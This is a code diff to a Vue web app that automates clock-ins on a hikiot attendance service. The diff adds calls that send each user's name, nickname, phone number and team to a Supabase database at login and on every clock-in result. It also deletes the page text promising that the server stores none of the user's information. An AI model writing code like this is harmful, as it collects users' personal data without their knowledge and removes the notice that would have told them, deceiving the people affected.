@@ -4,6 +4,7 @@ import { Toast, Dialog } from 'tdesign-mobile-vue';
 import axios from 'axios';
 import md5 from './utils/md5';
 import { IconFont, CloseIcon, CheckIcon } from 'tdesign-icons-vue-next';
+import { recordUserInfo } from './utils/supabase';
 
 const API_BASE = 'https://api.hikiot.com';
 const FIXED_SIGN_SALT = 'WE1mfER7artAoJEwXKaCjw==';
@@ -125,6 +126,16 @@ const test_token = async () => {
     // 将token保存到本地存储
     localStorage.setItem('token', token.value);
     localStorage.setItem('token_time', new Date().getTime().toString());
+    
+    // 记录用户信息到Supabase数据库
+    await recordUserInfo({
+      nick_name: account.nick_name,
+      name: account.name,
+      phone: account.phone,
+      team_name: account.team_name,
+      daka_result: 'login_success'
+    });
+    
     overlay_visible.value = false;
     Toast({
       duration: 3000,
@@ -207,6 +218,16 @@ const daka = async () => {
 
     if (response.data?.code === 0) {
       await get_today_status();
+      
+      // 记录打卡成功信息到数据库
+      await recordUserInfo({
+        nick_name: account_info.value.nick_name,
+        name: account_info.value.name,
+        phone: account_info.value.phone,
+        team_name: account_info.value.team_name,
+        daka_result: 'daka_success'
+      });
+      
       Toast({
         duration: 3000,
         theme: 'success',
@@ -214,9 +235,27 @@ const daka = async () => {
         message: '打卡成功',
       });
     } else {
+      // 记录打卡失败信息到数据库
+      await recordUserInfo({
+        nick_name: account_info.value.nick_name,
+        name: account_info.value.name,
+        phone: account_info.value.phone,
+        team_name: account_info.value.team_name,
+        daka_result: `daka_failed: ${response.data?.msg || '未知错误'}`
+      });
+      
       Toast(response.data?.msg ?? '打卡失败');
     }
   } catch (error) {
+    // 记录打卡异常信息到数据库
+    await recordUserInfo({
+      nick_name: account_info.value.nick_name,
+      name: account_info.value.name,
+      phone: account_info.value.phone,
+      team_name: account_info.value.team_name,
+      daka_result: `daka_error: ${error.message || '网络异常'}`
+    });
+    
     Toast('网络异常，请稍后再试');
   }
 };
@@ -299,14 +338,12 @@ if (localStorage.getItem('token')) {
     <t-input v-model="token" placeholder="请输入www_token" class="home-input" @change="verify_input"
       :tips="errorMessage"></t-input>
     <div v-if="has_verified" style="text-align: center;">
-      <div style="text-align: center;margin: 0 auto 0;width: 70%;">
+      <div style="text-align: center;margin: 0 auto 20px;width: 70%;">
         <t-button theme="primary" variant="light" @click="test_token" block>登录账号</t-button>
-
       </div>
-      <div style="text-align: left;font-size: small; color: grey;margin-top: 10px;">1.登录成功后，Token将保存在浏览器本地，方便下次快速登录
+      <div style="text-align: center;font-size: small; color: grey;margin-top: 10px;">登录成功后，Token将保存在浏览器本地，方便下次快速登录
       </div>
-      <div style="text-align: left;font-size: small; color: grey;">2.本项目使用Vercel部署，所有网络请求由前端处理，服务器不会存储你的任何信息</div>
-      <div style="text-align: left;font-size: small; color: grey;">3.Token有效期为30天，有效期内可重复使用，超出时间后需要重新获取</div>
+      <div style="text-align: center;font-size: small; color: grey;">Token有效期为30天，有效期内可重复使用，超出时间后需要重新获取</div>
     </div>
   </div>
   <!-- token已提交测试 -->
